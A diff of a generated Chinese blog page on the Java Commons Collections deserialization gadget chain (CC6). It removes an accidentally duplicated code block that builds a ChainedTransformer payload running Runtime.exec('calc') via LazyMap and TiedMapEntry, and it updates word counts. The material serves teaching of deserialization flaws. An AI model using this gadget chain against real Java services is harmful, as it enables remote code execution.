@@ -495,14 +495,14 @@
                 
                 <div class="info-break-policy">
                     <i class="far fa-file-word fa-fw"></i>文章字数:&nbsp;&nbsp;
-                    6.9k
+                    6.5k
                 </div>
                 
 
                 
                 <div class="info-break-policy">
                     <i class="far fa-clock fa-fw"></i>阅读时长:&nbsp;&nbsp;
-                    31 分
+                    28 分
                 </div>
                 
 
@@ -1100,7 +1100,8 @@ public class HashMapTest &#123;
         ObjectInputStream oi &#x3D; new ObjectInputStream(Files.newInputStream(Paths.get(&quot;ser.bin&quot;)));
         oi.readObject();
     &#125;
-&#125;xxxxxxxxxx package org;import org.apache.commons.collections.Transformer;import org.apache.commons.collections.functors.ChainedTransformer;import org.apache.commons.collections.functors.ConstantTransformer;import org.apache.commons.collections.functors.InvokerTransformer;import org.apache.commons.collections.keyvalue.TiedMapEntry;import org.apache.commons.collections.map.LazyMap;import java.io.IOException;import java.io.ObjectInputStream;import java.io.ObjectOutputStream;import java.lang.reflect.Field;import java.nio.file.Files;import java.nio.file.Paths;import java.util.HashMap;import java.util.Map;public class HashMapTest &#123;        public static void main(String[] args) throws IOException, ClassNotFoundException, NoSuchFieldException, IllegalAccessException &#123;        Transformer[] t &#x3D; new Transformer[]&#123;                new ConstantTransformer(Runtime.class),                new InvokerTransformer(&quot;getMethod&quot;, new Class[]&#123;String.class, Class[].class&#125;, new Object[]&#123;&quot;getRuntime&quot;, null&#125;),                new InvokerTransformer(&quot;invoke&quot;, new Class[]&#123;Object.class, Object[].class&#125;, new Object[]&#123;null, null&#125;),                new InvokerTransformer(&quot;exec&quot;, new Class[]&#123;String.class&#125;, new Object[]&#123;&quot;calc&quot;&#125;)        &#125;;        ChainedTransformer chainedTransformer &#x3D; new ChainedTransformer(t);        HashMap&lt;Object, Object&gt; objectObjectHashMap &#x3D; new HashMap&lt;&gt;();        objectObjectHashMap.put(&quot;111&quot;,&quot;222&quot;);        Map decorate &#x3D; LazyMap.decorate(objectObjectHashMap,new ConstantTransformer(1));        TiedMapEntry tiedMapEntry &#x3D; new TiedMapEntry(decorate,&quot;123&quot;);        HashMap&lt;Object, Object&gt; hashMap &#x3D; new HashMap&lt;&gt;();        hashMap.put(tiedMapEntry, &quot;123&quot;);        Class LazyMapClass &#x3D; LazyMap.class;        Field factory &#x3D; LazyMapClass.getDeclaredField(&quot;factory&quot;);        factory.setAccessible(true);        factory.set(decorate,chainedTransformer);&#x2F;&#x2F;        decorate.remove(tiedMapEntry.getKey());        decorate.clear();        ser(hashMap);        unser();    &#125;    public static void ser(Object obj) throws IOException &#123;        ObjectOutputStream oos &#x3D; new ObjectOutputStream(Files.newOutputStream(Paths.get(&quot;ser.bin&quot;)));        oos.writeObject(obj);    &#125;    public static void unser() throws IOException, ClassNotFoundException &#123;        ObjectInputStream oi &#x3D; new ObjectInputStream(Files.newInputStream(Paths.get(&quot;ser.bin&quot;)));        oi.readObject();    &#125;&#125;public class HashMapTest &#123;    public static void main(String[] args) throws IOException, ClassNotFoundException &#123;        Transformer[] t &#x3D; new Transformer[]&#123;                new ConstantTransformer(Runtime.class),                new InvokerTransformer(&quot;getMethod&quot;, new Class[]&#123;String.class, Class[].class&#125;, new Object[]&#123;&quot;getRuntime&quot;, null&#125;),                new InvokerTransformer(&quot;invoke&quot;, new Class[]&#123;Object.class, Object[].class&#125;, new Object[]&#123;null, null&#125;),                new InvokerTransformer(&quot;exec&quot;, new Class[]&#123;String.class&#125;, new Object[]&#123;&quot;calc&quot;&#125;)        &#125;;        ChainedTransformer chainedTransformer &#x3D; new ChainedTransformer(t);        HashMap&lt;Object, Object&gt; objectObjectHashMap &#x3D; new HashMap&lt;&gt;();        Map decorate &#x3D; LazyMap.decorate(objectObjectHashMap, chainedTransformer);        TiedMapEntry tiedMapEntry &#x3D; new TiedMapEntry(decorate,&quot;123&quot;);        HashMap&lt;Object, Object&gt; hashMap &#x3D; new HashMap&lt;&gt;();        hashMap.put(tiedMapEntry, &quot;123&quot;);        decorate.remove(tiedMapEntry.getKey());&#x2F;&#x2F;        decorate.clear();        ser(hashMap);        unser();    &#125;&#125;</code></pre>
+&#125;
+</code></pre>
 
 <h3 id="总结-2"><a href="#总结-2" class="headerlink" title="总结"></a>总结</h3><p>调用链为：</p>
 <p>HashMap -&gt; readObject</p>
@@ -1925,7 +1926,7 @@ $(function () {
             <br>
             
                 &nbsp;<i class="fas fa-chart-area"></i>&nbsp;站点总字数:&nbsp;<span
-                        class="white-color">191.2k</span>
+                        class="white-color">190.8k</span>
             
             
             
